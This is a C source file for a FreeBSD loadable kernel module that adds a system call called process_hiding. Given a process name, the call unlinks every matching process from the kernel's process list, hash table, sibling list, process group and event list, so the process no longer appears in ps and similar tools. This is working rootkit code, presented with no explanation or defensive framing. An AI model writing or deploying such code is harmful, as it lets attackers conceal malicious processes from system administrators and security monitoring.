#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/sysproto.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/queue.h>
#include <sys/lock.h>
#include <sys/sx.h>
#include <sys/mutex.h>

struct process_hiding_args {
	char *p_comm;
};

static int
process_hiding(struct thread *td, void *syscall_args)
{
	struct process_hiding_args *uap;
	uap = (struct process_hiding_args *)syscall_args;
	struct proc *p;
	
	sx_xlock(&allproc_lock);

	LIST_FOREACH(p, &allproc, p_list) {
		PROC_LOCK(p);
		if (!p->p_vmspace || (p->p_flag & P_WEXIT)) {
			PROC_UNLOCK(p);
			continue;
		}
		if (strncmp(p->p_comm, uap->p_comm, MAXCOMLEN) == 0) {
			LIST_REMOVE(p, p_list);
			LIST_REMOVE(p, p_hash);
			LIST_REMOVE(p, p_sibling);
			leavepgrp(p);
			knlist_detach(p->p_klist);
			p->p_klist = NULL;

		}
		PROC_UNLOCK(p);
	}

	sx_xunlock(&allproc_lock);

	return 0;
}

static struct sysent process_hiding_sysent = {
	1,
	process_hiding
};

static int offset = NO_SYSCALL;

static int 
load(struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd) {
	case MOD_LOAD:
		uprintf("System call loaded at offset %i\n", offset);
		break;
	case MOD_UNLOAD:
		uprintf("System call unloaded at offset %i\n", offset);
		break;
	default:
		error = EOPNOTSUPP;
		break;
	}
	
	return error;
}

SYSCALL_MODULE(process_hiding, &offset, &process_hiding_sysent, load, 0);
